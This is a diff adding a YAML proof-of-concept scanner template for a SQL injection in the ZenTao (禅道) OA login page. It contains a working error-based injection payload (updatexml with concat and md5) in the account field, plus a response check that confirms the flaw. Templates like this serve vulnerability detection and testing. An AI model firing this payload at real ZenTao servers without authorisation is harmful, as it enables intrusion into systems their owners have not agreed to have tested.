@@ -1,0 +1,22 @@
+id: poc-yaml-zentao-router-class-php-sql-injection
+info:
+  name: 禅道OA-user-router-class-php-SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 禅道OA
+variables:
+  v1: random_str(8)
+  v2: substr(str(md5(v1)),0,20)
+requests:
+- method: POST
+  path: /zentao/user-login.html
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Referer: '{{.base_url}}/zentao/user-login.html'
+  data: account=admin'+and+updatexml(1,concat(0x1,md5('{{.v1}}')),1)+and+'1'='1
+  expression: 'status_code == 200 && contains(body, v2) && contains(body, "Uncaught
+    PDOException: SQLSTATE[HY000]")
+
+    '
+transport: http
